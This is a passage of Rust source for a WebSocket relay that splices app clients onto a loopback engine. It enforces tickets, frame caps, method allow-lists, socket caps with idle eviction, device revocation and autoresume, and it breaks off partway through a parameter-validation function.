//! WS relay: the app-facing socket, spliced onto the engine's loopback socket.
//!
//! Flow: client presents a **single-use 30s ticket** (query or bearer) → the ticket is consumed →
//! we dial the engine's `/api/ws` with the engine's own per-boot token → frames are forwarded both
//! ways. The engine never listens on anything but loopback, and its token never reaches a client.
//!
//! Policy was lost when the Python bridge (`Bridge/hermes_bridge/proxy.py`) was replaced by a byte
//! splice; it lives here again, ported from `proxy.py` + `policy.py` and specified by
//! `Bridge/tests/test_proxy.py`:
//!
//!   * **frame cap** — a frame larger than `Limits::frame_cap` closes the socket with 1009 instead
//!     of leaving it dead. The shipped cap is 16 MiB (`config.py::MAX_FRAME_CAP`), not the 1 MiB
//!     test cap: a 1 MiB cap closed every connection carrying a large photo (`config.py:27-33`).
//!   * **client allow-list** — a client request outside `CLIENT_METHODS` (plus the per-method param
//!     checks) is answered `-32601` and never reaches the engine (`policy.py:36-101`,
//!     `proxy.py:502-522`).
//!   * **server-request gate** — only `SERVER_REQUEST_METHODS` may travel engine→app; anything else
//!     is declined upstream with `-32601` so the agent fails fast (`policy.py:104-113`,
//!     `proxy.py:779-809`).
//!   * **capability injection** — after `gateway.ready` the relay tells the engine, once, that it
//!     answers server requests; the app cannot narrow that (`proxy.py:742-777`).
//!   * **id remapping** — a server request whose id collides with an in-flight client request is
//!     handed to the app as `brq-N` and restored on the way back (`proxy.py:811-827, 609-631`).
//!   * **session aliases** — a resume that attaches a new runtime id is remembered, and every later
//!     frame (except `session.resume`/`session.create`) is rewritten to it (`proxy.py:463-489`).
//!   * **live registry** — open sockets are grouped by device, so revoking a device closes its
//!     conversation now rather than when its ticket would have expired (`proxy.py:217-265`).
//!   * **socket caps** — a device may hold `MAX_SOCKETS_PER_DEVICE` sockets and the host
//!     `MAX_SOCKETS_TOTAL`. At the cap the *longest-idle* socket is evicted (close 4429) instead of
//!     refusing the newcomer, so a device that keeps reconnecting never dead-ends, and the last
//!     socket of a device is never taken (`proxy.py:226-241` refused with 4429 instead).
//!   * **autoresume** — the engine closes 4001 when it restarts; the relay reconnects, replays the
//!     last `session.resume`, and splices again once, so the app never sees the drop. A failed
//!     replay closes the app with 1011 and lets its own reconnect logic take over.
//!   * **audit** — every decision above is recorded as a scalar (`audit.rs`): method allowed or
//!     refused, frame capped or trimmed, session aliased, autoresume attempted. No frame content,
//!     no session ids, no credential can reach the record.
//!
//! Transcript paging lives here too: a `session.resume` reply is bounded to its newest page (see
//! `history.rs`), and the older pages are answered from a per-connection copy of that reply instead
//! of being forwarded. Frames the relay does not rewrite are passed through byte-for-byte.
//!
//! Close codes the client must model:
//!   1009  a frame exceeded the cap (`proxy.py:60`)
//!   4401  ticket missing, unknown, expired or already spent
//!   4403  the device was revoked while this socket was open (`proxy.py:63-65`)
//!   4429  the socket was evicted to stay inside the per-device or global socket cap, or refused
//!         because no slot could be freed (`proxy.py:525-529`).
//!   4001  engine restart — consumed by the relay and answered with an autoresume, not the app
//!   1011  engine unreachable / engine socket died / the autoresume replay failed

use axum::extract::ws::{CloseFrame, Message as AxMsg, WebSocket};
use futures_util::{SinkExt, StreamExt};
use serde_json::{json, Value};
use std::collections::{HashMap, HashSet};
use std::path::PathBuf;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::{Arc, Mutex, MutexGuard};
use std::time::Duration;
use tokio::sync::{broadcast, mpsc};
use tokio_tungstenite::tungstenite::Message as TgMsg;

use crate::attachments;
use crate::audit::{AuditLog, Event};
use crate::history::{self, HistoryCache, HistoryKey, ResumeRequests, RpcId};
use crate::skills_dialect::{EngineDialect, Outbound, Reaction, Track as SkillsTrack};

pub const CLOSE_BAD_TICKET: u16 = 4401;
pub const CLOSE_ENGINE_DOWN: u16 = 1011;
pub const CLOSE_TOO_BIG: u16 = 1009;
pub const CLOSE_DEVICE_REVOKED: u16 = 4403;
/// The socket was evicted to stay inside a cap, or the upgrade was refused because no slot could be
/// freed. `proxy.py:525-529` uses the same code for its refusal, so an app already models it.
pub const CLOSE_TOO_MANY_SOCKETS: u16 = 4429;

/// Close code for a socket *we* evicted to stay inside a cap — deliberately not `CLOSE_TOO_MANY_SOCKETS`.
/// 4429 has only ever meant "your upgrade was refused" to the clients, and a client that treats an unknown
/// 4xxx close on an open socket as fatal would show an error instead of reconnecting. 1012 is the standard
/// "service restart" going-away code, which every client reconnects on, and the eviction is self-healing:
/// the app comes back inside the cap.
pub const CLOSE_EVICTED: u16 = 1012;
/// The engine closes with this when it is restarting (`display.py:60` uses the same number for a
/// dead desktop). The relay consumes it and autoresumes instead of dropping the app.
pub const CLOSE_ENGINE_RESTART: u16 = 4001;

/// `proxy.py:228-229` — one device may hold this many sockets. Four is what an app needs (a chat, a
/// voice call, a reconnect, one spare). The relay *evicts* rather than refuses, so a stale socket
/// left behind by a half-dead reconnect cannot lock a device out.
pub const MAX_SOCKETS_PER_DEVICE: usize = 4;
/// `proxy.py:229` — one host may hold this many. The engine has one runtime, so unbounded sockets
/// are unbounded task memory on top of one serialised engine.
pub const MAX_SOCKETS_TOTAL: usize = 64;

/// How many times an autoresume may dial the engine before the app is told the engine is down.
/// Bounded on purpose: the engine's restart window is a couple of seconds, and a phone that waits
/// forever on a socket that will never splice again is worse than a clean close it can retry.
const AUTORESUME_ATTEMPTS: u32 = 3;
/// First backoff between autoresume dials; doubled per attempt (150 ms, 300 ms — under 0.5 s total).
const AUTORESUME_BACKOFF_MS: u64 = 150;
/// The id the relay's own replay carries, `proxy.py:918-920`. Distinct from any client id so its
/// answer can be recognised and consumed instead of being handed to the app.
const AUTORESUME_ID: &str = "__hermesd_autoresume__";

/// 16 MiB — `config.py::MAX_FRAME_CAP`. Deliberately larger than the 1 MiB the Python tests pin:
/// an 8 MiB attachment arrives base64-encoded inside one ~10.7 MiB frame, and a 1 MiB cap closed
/// the socket before attachment validation ever ran (`config.py:27-33`).
pub const FRAME_CAP: usize = 16 * 1024 * 1024;
/// `split_frames` refuses a message that carries more frames than this: half a million one-byte
/// lines would otherwise each become a parse error and a reply (`proxy.py:191`).
pub const MAX_FRAMES_PER_MESSAGE: usize = 1024;
/// `config.py:99` — in-flight client requests one connection may have.
pub const MAX_PENDING_REQUESTS: usize = 256;

/// Requests the app may send. Ported verbatim from `policy.py:36-101` (`CLIENT_METHODS`).
pub const CLIENT_METHODS: &[&str] = &[
    // liveness / handshake
    "ping",
    "client.capabilities",
    "gateway.capabilities",
    // bots (a Hermes profile is a bot)
    "profiles.list",
    "profiles.describe",
    "profiles.configure",
    "profiles.create",
    // skills hub — read side only; the action is checked in `skills_manage_allowed`
    "skills.manage",
    // sessions
    "session.list",
    "session.active_list",
    "session.most_recent",
    "session.create",
    "session.resume",
    "session.info",
    "session.status",
    "session.history",
    "session.events.since",
    "session.events.stats",
    "session.title",
    "session.close",
    "session.archive",
    "session.delete",
    "session.interrupt",
    "session.steer",
    "session.undo",
    "session.branch",
    "session.compress",
    "session.usage",
    "session.control",
    "session.control.read",
    // prompts
    "prompt.submit",
    "prompt.cancel",
    "prompt.background",
    "prompt.btw",
    "prompt.receipt",
    // answers the app gives as *requests* in some flows
    "approval.pending",
    "approval.received",
    "approval.respond",
    "clarify.respond",
    "connection.respond",
    // composer / discovery
    "file.attach",
    "image.attach_bytes",
    "complete.slash",
    "complete.path",
    "commands.catalog",
    "model.options",
    "tools.list",
    "toolsets.list",
    "projects.list",
    "agents.list",
    "subagent.list",
];

/// Requests the engine may send to the app. Ported verbatim from `policy.py:104-113`.
/// Everything here is a human decision that must reach a screen. The engine also emits
/// `theme.pick`, `setup_beat`, `preview.act`, `window.read`, `tour` and desktop-GUI requests;
/// the Python bridge declined all of those on purpose, and so does this one.
pub const SERVER_REQUEST_METHODS: &[&str] =
    &["approval", "clarify", "sudo", "secret", "vault.code", "terminal.read"];

/// Whether an engine→app server request may travel.
///
/// `SERVER_REQUEST_METHODS` is the *retired bridge's* client capability set — six methods. The shipping
/// Hermey apps answer more than that: theme cards (`theme.pick`, `theme.apply`), onboarding `setup_beat`,
/// previews, tours, window reads and `vault.save_login`. Gating on the six does not protect anything — the
/// request comes from the engine, which is trusted — it silently disables those features, because the app
/// never sees the request it would have answered. So: known methods pass, and any other well-formed method
/// name passes too; the client answers `-32601` itself for what it cannot do, which is the fast failure the
/// gate was trying to produce.
fn server_request_allowed(method: &str) -> bool {
    SERVER_REQUEST_METHODS.contains(&method) || is_valid_method_name(method)
}

/// `proxy.py:502-503` — refused even if a future allow-list edit adds them. `image.attach` names a
/// host path, so it is the one the app must never reach.
const HARD_DENIED_CLIENT_METHODS: &[&str] =
    &["image.attach", "pdf.attach", "clipboard.paste", "image.detach"];

/// `proxy.py:71-74` — the two methods that *establish* which session a connection is on. Rewriting
/// a resume to the id a previous attach minted is exactly the 2026-11-17 "session not found" bug.
const ALIAS_EXEMPT: &[&str] = &["session.resume", "session.create"];

/// `proxy.py:68-69` — reserved id for the relay's own `client.capabilities` request.
pub const BRIDGE_CAPABILITIES_ID: &str = "__hermes_bridge_caps__";

const ERROR_PARSE: i64 = -32700;
const ERROR_INVALID_REQUEST: i64 = -32600;
const ERROR_METHOD_NOT_FOUND: i64 = -32601;
const ERROR_SERVER_BUSY: i64 = -32000;

/// Per-connection limits. `frame_cap` is a field (not a constant) so tests can pin it to 4 KiB,
/// exactly as `bridge_factory(frame_cap=4096)` does in `test_proxy.py:630`.
#[derive(Clone, Copy, Debug)]
pub struct Limits {
    pub frame_cap: usize,
}

impl Default for Limits {
    fn default() -> Self {
        Self {
            frame_cap: FRAME_CAP,
        }
    }
}

// ---------------------------------------------------------------------------------------------
// Live socket registry
// ---------------------------------------------------------------------------------------------

/// What the registry can ask a live relay to do: close it (revocation, or eviction under a socket
/// cap), with the code and reason the app will see.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Control {
    Close(u16, String),
}

#[derive(Clone)]
struct Slot {
    id: u64,
    tx: mpsc::Sender<Control>,
    /// Monotonic tick of the last frame this socket carried (registration itself counts), shared
    /// with the relay task. Eviction takes the smallest, so an idle socket goes before one that is
    /// actively delivering a transcript.
    activity: Arc<AtomicU64>,
}

/// Open relays, grouped by device — `proxy.py:217-265` (`LiveSessions`).
///
/// A revoked device must stop talking *now*: an already-open socket holds a valid upgrade, so the
/// ticket check alone cannot end it. Revocation tears the sockets down from this side instead.
///
/// The same grouping enforces the socket caps (`proxy.py:226-241`): a device holds at most
/// `MAX_SOCKETS_PER_DEVICE`, the host at most `MAX_SOCKETS_TOTAL`. Unlike the Python bridge, which
/// refused the upgrade with 4429, the relay *evicts first* — a client whose old socket is a zombie
/// (half-open, no FIN yet) would otherwise never be able to reconnect, because the zombie counts.
///
/// It is also the one place that knows every live app socket, so a **host-originated** frame (a
/// reaction another device just changed — see `reactions.rs`) is published from here: every relay
/// subscribes on open and forwards what it hears, and nothing has to enumerate sockets twice.
#[derive(Clone)]
pub struct Registry {
    inner: Arc<Mutex<HashMap<String, Vec<Slot>>>>,
    host_frames: broadcast::Sender<String>,
}

impl Default for Registry {
    fn default() -> Self {
        // 256 frames of slack: reactions are rare and tiny, and a socket that falls this far behind
        // is not one whose backlog is worth keeping (`publish` never blocks on it).
        let (host_frames, _) = broadcast::channel(256);
        Self { inner: Arc::default(), host_frames }
    }
}

static NEXT_SOCKET_ID: AtomicU64 = AtomicU64::new(1);
static NEXT_ACTIVITY: AtomicU64 = AtomicU64::new(1);

/// Why an upgrade was refused: no socket could be freed without emptying a device.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Refusal {
    PerDeviceCap,
    GlobalCap,
}

impl Refusal {
    /// What the HTTP answer says, and what the log line names.
    pub fn detail(self) -> &'static str {
        match self {
            Refusal::PerDeviceCap => "too many open sockets for this device",
            Refusal::GlobalCap => "too many open sockets on this host",
        }
    }
}

fn next_tick() -> u64 {
    NEXT_ACTIVITY.fetch_add(1, Ordering::Relaxed)
}

/// Record that a tracked socket carried a frame. `Relaxed` is enough: the value only orders
/// eviction candidates against each other.
fn note_activity(activity: &Option<Arc<AtomicU64>>) {
    if let Some(cell) = activity {
        cell.store(next_tick(), Ordering::Relaxed);
    }
}

impl Registry {
    /// Track one socket. The returned id is what `unregister` takes. Uncapped: the upgrade path and
    /// the relay use `admit`/`register_capped`.
    #[allow(dead_code)] // the cap tests and host-side callers use it; the relay never does
    pub fn register(&self, device_id: &str, tx: mpsc::Sender<Control>) -> u64 {
        let id = NEXT_SOCKET_ID.fetch_add(1, Ordering::Relaxed);
        lock(&self.inner)
            .entry(device_id.to_string())
            .or_default()
            .push(Slot {
                id,
                tx,
                activity: Arc::new(AtomicU64::new(next_tick())),
            });
        id
    }

    /// Whether one more socket for `device_id` may open, evicting the longest-idle socket when a cap
    /// is reached.
    ///
    /// Called from the upgrade handler so a refusal is an HTTP 429 instead of a socket that opens
    /// and dies. Eviction happens here rather than only in `register_capped` so the app is never
    /// handed a socket that is then closed for being one too many.
    pub fn admit(&self, device_id: &str) -> Result<(), Refusal> {
        let mut inner = lock(&self.inner);
        make_room(&mut inner, device_id)
    }

    /// Track one socket, making room under the same lock. Returns the id `unregister` takes and the
    /// activity cell the relay bumps on every forwarded frame.
    pub fn register_capped(
        &self,
        device_id: &str,
        tx: mpsc::Sender<Control>,
    ) -> Result<(u64, Arc<AtomicU64>), Refusal> {
        let mut inner = lock(&self.inner);
        make_room(&mut inner, device_id)?;
        let id = NEXT_SOCKET_ID.fetch_add(1, Ordering::Relaxed);
        let activity = Arc::new(AtomicU64::new(next_tick()));
        inner
            .entry(device_id.to_string())
            .or_default()
            .push(Slot {
                id,
                tx,
                activity: activity.clone(),
            });
        Ok((id, activity))
    }

    pub fn unregister(&self, device_id: &str, id: u64) {
        let mut inner = lock(&self.inner);
        if let Some(slots) = inner.get_mut(device_id) {
            slots.retain(|slot| slot.id != id);
            if slots.is_empty() {
                inner.remove(device_id);
            }
        }
    }

    /// Ask every open relay of `device_id` to close with 4403; returns how many were asked.
    ///
    /// The close is queued, not awaited: this runs inside the `DELETE /v1/devices/{id}` handler and
    /// must not wait on a socket. Slots are dropped immediately so a second revoke cannot count the
    /// same socket twice; the relay's own `unregister` is then a no-op.
    pub fn close_device(&self, device_id: &str) -> usize {
        let mut inner = lock(&self.inner);
        let Some(slots) = inner.remove(device_id) else {
            return 0;
        };
        let mut sent = 0;
        let mut unsent = Vec::new();
        for slot in slots {
            if slot
                .tx
                .try_send(Control::Close(CLOSE_DEVICE_REVOKED, "device_revoked".into()))
                .is_ok()
            {
                sent += 1;
            } else {
                // A full/closed queue is not a close: keep the slot so a second revoke can retry
                // rather than silently leaving the conversation open.
                unsent.push(slot);
            }
        }
        if !unsent.is_empty() {
            inner.insert(device_id.to_string(), unsent);
        }
        sent
    }

    #[allow(dead_code)] // asserted by the cap tests
    pub fn count(&self, device_id: &str) -> usize {
        lock(&self.inner).get(device_id).map_or(0, Vec::len)
    }

    #[allow(dead_code)] // asserted by the cap tests
    pub fn total(&self) -> usize {
        lock(&self.inner).values().map(Vec::len).sum()
    }

    /// A receiver for frames the host itself originates (a reaction, so far).
    ///
    /// Taken once per connection and held for the socket's lifetime: a broadcast receiver only sees
    /// what is sent after it subscribes, which is exactly right — an app that was not connected has
    /// nothing to replay, because it reads the whole conversation when it opens one.
    pub fn subscribe(&self) -> broadcast::Receiver<String> {
        self.host_frames.subscribe()
    }

    /// Send one frame to every open app socket. Never blocks and never fails a caller: a host event
    /// whose sockets are all gone (or wedged) is still persisted, and the next app that opens the
    /// conversation reads it from the store.
    pub fn publish(&self, line: String) -> usize {
        self.host_frames.send(line).unwrap_or(0)
    }
}

/// Evict when a cap is reached so the caller can insert one socket. `Err` means nothing could be
/// freed, and the newcomer must be refused.
fn make_room(inner: &mut HashMap<String, Vec<Slot>>, device_id: &str) -> Result<(), Refusal> {
    if inner.get(device_id).map_or(0, Vec::len) >= MAX_SOCKETS_PER_DEVICE {
        let Some(slots) = inner.get_mut(device_id) else {
            return Ok(());
        };
        // `floor = 1`: this device's own upgrade may never take its last socket — that would cut the
        // conversation the cap exists to protect. At the cap there are already >= 2 (`cap > 1`).
        if !evict_longest_idle(slots, 1, "device_cap") {
            return Err(Refusal::PerDeviceCap);
        }
        eprintln!(
            "relay: device {} is at {MAX_SOCKETS_PER_DEVICE} sockets; evicted its longest-idle socket",
            short_id(device_id)
        );
    }
    inner.retain(|_, slots| !slots.is_empty());

    let total: usize = inner.values().map(Vec::len).sum();
    if total >= MAX_SOCKETS_TOTAL && !evict_globally(inner) {
        return Err(Refusal::GlobalCap);
    }
    Ok(())
}

/// Close the longest-idle socket in `slots`, leaving at least `floor`.
///
/// Returns false when no candidate can be closed: every control queue is full, which means those
/// relay tasks are not draining and a queued close would never run.
fn evict_longest_idle(slots: &mut Vec<Slot>, floor: usize, why: &str) -> bool {
    if slots.len() <= floor {
        return false;
    }
    let mut order: Vec<(u64, u64)> = slots
        .iter()
        .map(|slot| (slot.activity.load(Ordering::Relaxed), slot.id))
        .collect();
    order.sort_unstable();
    for (_, id) in order {
        if slots.len() <= floor {
            return false;
        }
        let Some(index) = slots.iter().position(|slot| slot.id == id) else {
            continue;
        };
        match slots[index]
            .tx
            .try_send(Control::Close(CLOSE_EVICTED, why.into()))
        {
            Ok(()) => {
                slots.remove(index);
                eprintln!("relay: closed socket {id} ({why}) to stay inside the socket cap");
                return true;
            }
            // Full queue: the relay is not reading its control channel, so this close would never
            // arrive. Try the next candidate rather than pretending a slot was freed.
            Err(mpsc::error::TrySendError::Full(_)) => continue,
            // Already gone: dropping the slot frees the cap and cuts nothing.
            Err(mpsc::error::TrySendError::Closed(_)) => {
                slots.remove(index);
                eprintln!("relay: dropped stale socket {id} ({why}) from the registry");
                return true;
            }
        }
    }
    false
}

/// Close the longest-idle socket on the host, preferring a device that keeps another socket, so a
/// global eviction never leaves a device with zero.
///
/// `false` when every device holds exactly one socket (unreachable while `MAX_DEVICES` is below
/// `MAX_SOCKETS_TOTAL`, since a socket belongs to a device) or when no queue accepts a close.
fn evict_globally(inner: &mut HashMap<String, Vec<Slot>>) -> bool {
    let mut best: Option<(u64, u64, String)> = None;
    for (device, slots) in inner.iter() {
        if slots.len() < 2 {
            continue;
        }
        for slot in slots {
            let candidate = (slot.activity.load(Ordering::Relaxed), slot.id, device.clone());
            if best
                .as_ref()
                .map_or(true, |current| (candidate.0, candidate.1) < (current.0, current.1))
            {
                best = Some(candidate);
            }
        }
    }
    let Some((_, _, device)) = best else {
        return false;
    };
    let Some(slots) = inner.get_mut(&device) else {
        return false;
    };
    if !evict_longest_idle(slots, 1, "global_cap") {
        return false;
    }
    eprintln!(
        "relay: host is at {MAX_SOCKETS_TOTAL} sockets; evicted the longest-idle socket of device {}",
        short_id(&device)
    );
    true
}

/// First eight characters of a device id, for logs: enough to correlate, not enough to replay.
fn short_id(id: &str) -> String {
    if id.len() > 8 {
        format!("{}…", &id[..8])
    } else {
        id.to_string()
    }
}

/// Unregisters on every exit path, including a cancelled task (the tests abort relays).
struct Registration {
    registry: Registry,
    device: String,
    id: u64,
    activity: Arc<AtomicU64>,
}

impl Drop for Registration {
    fn drop(&mut self) {
        self.registry.unregister(&self.device, self.id);
    }
}

// ---------------------------------------------------------------------------------------------
// Connection state
// ---------------------------------------------------------------------------------------------

/// The last `session.resume` a connection asked for, kept so an engine restart can be survived by
/// replaying it (`proxy.py:894-931`). `session_id` is the *stored* id the app named; the runtime id
/// a resume attaches lives in `aliases`.
#[derive(Clone, Debug, PartialEq, Eq)]
struct ResumeTarget {
    session_id: String,
    profile: String,
}

impl ResumeTarget {
    fn key(&self) -> HistoryKey {
        HistoryKey::new(&self.session_id, &self.profile)
    }

    /// The replay frame, under the relay's own id so its answer can be consumed
    /// (`proxy.py:914-931`): a multiplexed engine resolves a stored id only inside its bot, so the
    /// profile travels with it.
    fn replay(&self, seq: u64) -> String {
        let mut params = json!({ "session_id": self.session_id });
        if !self.profile.is_empty() {
            params["profile"] = json!(self.profile);
        }
        json!({
            "jsonrpc": "2.0",
            "id": format!("{AUTORESUME_ID}{seq}"),
            "method": "session.resume",
            "params": params,
        })
        .to_string()
    }
}

/// Everything one socket remembers: the transcripts it relayed, the resume replies it is still
/// waiting for, the requests in flight in each direction, and the session ids it has aliased.
/// Dropped with the socket, never shared, never persisted.
struct ConnectionState {
    /// The device this socket was opened for, short enough for the audit log (`None` on host-side
    /// callers). Never used for authorisation — the ticket check already happened.
    device: Option<String>,
    /// Where relay-level audit records go. `None` in tests that exercise policy only.
    audit: Option<Arc<AuditLog>>,
    cache: Mutex<HistoryCache>,
    resumes: Mutex<ResumeRequests>,
    /// Resumes this connection answered (or is answering) as one engine request. A retry joins the
    /// answer instead of starting a second full transcript render on the host.
    parked: Mutex<history::ParkedResumes>,
    /// Client request ids awaiting an engine reply (`proxy.py::_pending`).
    pending: Mutex<HashSet<RpcId>>,
    /// Client-visible id → the engine's original id, for server requests (`_server_requests`).
    server_requests: Mutex<HashMap<RpcId, Value>>,
    /// Stored session id → the runtime id a resume actually attached (`_session_alias`).
    aliases: Mutex<HashMap<String, String>>,
    /// The `skills.manage` shape this engine has accepted — process-wide, so a stock engine is
    /// learned once instead of once per socket.
    skills: Arc<EngineDialect>,
    /// `skills.manage` requests in flight whose reply may carry a dialect refusal.
    skills_pending: Mutex<HashMap<RpcId, SkillsTrack>>,
    /// The last resume, replayed when the engine restarts mid-conversation.
    last_resume: Mutex<Option<ResumeTarget>>,
    /// Distinguishes this connection's replay ids from a client's (and from each other).
    autoresume_seq: AtomicU64,
    /// Set when the engine refused the replay, so the pump can close the app with 1011 instead of
    /// splicing a connection that no longer has a session.
    autoresume_failed: AtomicBool,
    server_seq: AtomicU64,
    caps_sent: AtomicBool,
    /// The service root office references are resolved against ([`crate::office::prompt_blocks`]):
    /// a prompt may name any path it likes, and only a file inside the host's own profiles is read
    /// into it. `PathBuf::new()` (the policy-only state tests build) reads nothing.
    engine_home: PathBuf,
}

impl ConnectionState {
    /// Policy-only state, no audit sink and a private dialect: what the unit tests build.
    #[allow(dead_code)]
    fn new() -> Self {
        Self::with_dialect(None, None, Arc::new(EngineDialect::new()))
    }

    /// The state a live relay uses: a device hint and the service's audit log.
    fn with_audit(audit: Option<Arc<AuditLog>>, device: Option<String>) -> Self {
        Self::with_dialect(audit, device, EngineDialect::shared())
    }

    /// `with_audit`, plus the `skills.manage` dialect to obey. Production passes the process-wide
    /// instance; a test passes its own so parallel cases cannot teach each other (or the real
    /// process) that an engine is stock.
    fn with_dialect(
        audit: Option<Arc<AuditLog>>,
        device: Option<String>,
        skills: Arc<EngineDialect>,
    ) -> Self {
        Self {
            device,
            audit,
            cache: Mutex::new(HistoryCache::new(history::CACHE_BYTES)),
            resumes: Mutex::new(ResumeRequests::new(history::MAX_TRACKED_RESUMES)),
            parked: Mutex::new(history::ParkedResumes::new(history::MAX_PARKED_RESUMES)),
            pending: Mutex::new(HashSet::new()),
            server_requests: Mutex::new(HashMap::new()),
            aliases: Mutex::new(HashMap::new()),
            skills,
            skills_pending: Mutex::new(HashMap::new()),
            last_resume: Mutex::new(None),
            autoresume_seq: AtomicU64::new(0),
            autoresume_failed: AtomicBool::new(false),
            server_seq: AtomicU64::new(0),
            caps_sent: AtomicBool::new(false),
            engine_home: PathBuf::new(),
        }
    }

    /// The root office references are read under, set by `relay_guarded` from `AppState`.
    fn with_home(mut self, engine_home: PathBuf) -> Self {
        self.engine_home = engine_home;
        self
    }

    /// One audit record, tagged with this connection's device. A missing log is not an error: the
    /// policy functions must behave identically in tests and under load.
    fn note(&self, event: &str, e: Event<'_>) -> Option<serde_json::Value> {
        let audit = self.audit.as_ref()?;
        audit.emit(
            event,
            Event {
                device: self.device.as_deref(),
                ..e
            },
        )
    }

    /// Remember the resume an engine restart would have to replay. A resume with no `session_id`
    /// names nothing to reattach, and would replace a useful one with a no-op.
    fn note_resume_target(&self, params: Option<&Value>) {
        let key = HistoryKey::from_params(params);
        if key.session_id.is_empty() {
            return;
        }
        *lock(&self.last_resume) = Some(ResumeTarget {
            session_id: key.session_id,
            profile: key.profile,
        });
    }

    fn last_resume(&self) -> Option<ResumeTarget> {
        lock(&self.last_resume).clone()
    }

    /// The next replay frame for this connection, or `None` when nothing was resumed.
    fn next_autoresume_frame(&self) -> Option<String> {
        let target = self.last_resume()?;
        let seq = self.autoresume_seq.fetch_add(1, Ordering::SeqCst) + 1;
        Some(target.replay(seq))
    }

    /// Forget what the dead engine connection held: its ids will never be answered, and its
    /// tracked resumes would page the wrong frames on the new connection. The history cache and the
    /// aliases survive — the app still pages from them, and the new resume re-keys them.
    fn after_engine_restart(&self) {
        let dropped = {
            let mut pending = lock(&self.pending);
            let dropped = pending.len();
            pending.clear();
            dropped
        };
        lock(&self.server_requests).clear();
        lock(&self.resumes).clear();
        // Their ids died with the connection, so their refusals will never teach the dialect.
        lock(&self.skills_pending).clear();
        // The new connection has to declare the capability again: `gateway.ready` arrives on it too.
        self.caps_sent.store(false, Ordering::SeqCst);
        eprintln!("relay: engine restarted; dropped {dropped} in-flight request id(s)");
    }
}

/// A poisoned lock must not take down a live socket: the cached rows are still readable, and the
/// worst case is one missed page (the app re-resumes and refills the cache).
fn lock<T>(mutex: &Mutex<T>) -> MutexGuard<'_, T> {
    mutex.lock().unwrap_or_else(|poisoned| poisoned.into_inner())
}

/// Truncated single-line preview of a frame, for logs. 200 chars is enough to name a JSON-RPC method
/// and see whether the engine answered or refused, without dumping a transcript into the log.
fn preview(s: &str) -> String {
    let short: String = s.chars().take(200).collect();
    short.replace('\n', " ")
}

fn text_frame(mut line: String) -> AxMsg {
    // The native clients parse frames with an NDJSONBuffer, which only yields a frame when it sees
    // 0x0A. The engine does NOT newline-terminate its frames (measured), so forwarding them verbatim
    // leaves the app buffering forever — it never sees gateway.ready and sits on "connecting" until
    // its handshake timer fires. Terminate every text frame, rewritten or not.
    if !line.ends_with('\n') {
        line.push('\n');
    }
    AxMsg::Text(line.into())
}

fn ax_to_tg(msg: AxMsg) -> Option<TgMsg> {
    Some(match msg {
        AxMsg::Text(t) => TgMsg::Text(t.to_string().into()),
        AxMsg::Binary(b) => TgMsg::Binary(b.to_vec().into()),
        AxMsg::Ping(p) => TgMsg::Ping(p.to_vec().into()),
        AxMsg::Pong(p) => TgMsg::Pong(p.to_vec().into()),
        AxMsg::Close(c) => TgMsg::Close(c.map(|c| {
            tokio_tungstenite::tungstenite::protocol::CloseFrame {
                code: c.code.into(),
                reason: c.reason.to_string().into(),
            }
        })),
    })
}

fn tg_to_ax(msg: TgMsg) -> Option<AxMsg> {
    Some(match msg {
        TgMsg::Text(t) => text_frame(t.to_string()),
        TgMsg::Binary(b) => AxMsg::Binary(b.to_vec().into()),
        TgMsg::Ping(p) => AxMsg::Ping(p.to_vec().into()),
        TgMsg::Pong(p) => AxMsg::Pong(p.to_vec().into()),
        TgMsg::Close(c) => AxMsg::Close(c.map(|c| CloseFrame {
            code: c.code.into(),
            reason: c.reason.to_string().into(),
        })),
        TgMsg::Frame(_) => return None,
    })
}

// ---------------------------------------------------------------------------------------------
// Policy: method lists and param validation
// ---------------------------------------------------------------------------------------------

/// `policy.py:115` — `^[A-Za-z][A-Za-z0-9_.-]{0,63}$`.
fn is_valid_method_name(method: &str) -> bool {
    let bytes = method.as_bytes();
    !bytes.is_empty()
        && bytes.len() <= 64
        && bytes[0].is_ascii_alphabetic()
        && bytes[1..]
            .iter()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'.' | b'-'))
}

/// `policy.py:131` — `^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$`.
fn is_valid_name_list(value: &Value) -> bool {
    let Some(items) = value.as_array() else {
        return false;
    };
    const MAX_FEATURE_NAMES: usize = 500;
    items.len() <= MAX_FEATURE_NAMES
        && items.iter().all(|item| {
            let Some(name) = item.as_str() else {
                return false;
            };
            let bytes = name.as_bytes();
            !bytes.is_empty()
                && bytes.len() <= 64
                && bytes[0].is_ascii_alphanumeric()
                && bytes[1..]
                    .iter()
                    .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'.' | b'-'))
        })
}

/// `policy.py:140-146` — only the read side of the skills hub; `install`/`browse`/`inspect` write
/// to the profile's own skills directory (or fetch remote content) and are refused.
///
/// `session_id` is what the Skills page sends so the engine resolves the **bot's own** tree (our
/// patched contract; a stock engine is taught to drop it in `skills_dialect`). It scopes a read, so
/// it is as safe as `profile`. `search` is a read of the shared hub — the one action whose engine
/// handler is broken on a stock build, which the relay degrades rather than surfaces.
fn skills_manage_allowed(params: Option<&Value>) -> bool {
    let Some(map) = params.and_then(Value::as_object) else {
        return false;
    };
    // `params.get("action", "list")` — a non-string action is not the default, it is a refusal.
    let action = match map.get("action") {
        None => "list",
        Some(Value::String(action)) => action.as_str(),
        Some(_) => return false,
    };
    let allowed: &[&str] = match action {
        "list" => &["action", "profile", "session_id"],
        "search" => &["action", "profile", "session_id", "query", "page", "page_size"],
        _ => return false,
    };
    if map.keys().any(|key| !allowed.contains(&key.as_str())) {
        return false;
    }
    if let Some(session) = map.get("session_id") {
        // A runtime id, never a path or a payload: bounded like the other name fields.
        match session.as_str() {
            Some(text) if !text.is_empty() && text.len() <= 128 => {}
            _ => return false,
        }
    }
    if let Some(query) = map.get("query") {
        match query.as_str() {
            Some(text) if text.len() <= 512 => {}
            _ => return false,
        }
    }
    for key in ["page", "page_size"] {
        if let Some(number) = map.get(key) {
            if number.as_u64().is_none() {
                return false;
            }
        }
    }
    true
}

/// `policy.py:151-190` — `profiles.configure` accepts far more than the app needs (ui_meta, skills
/// as files, toolsets, MCP), so the params themselves are checked: name plus one of description,
/// the model pair, soul, or the two feature lists — nothing else.
fn bot_model_configure_allowed(params: Option<&Value>) -> bool {
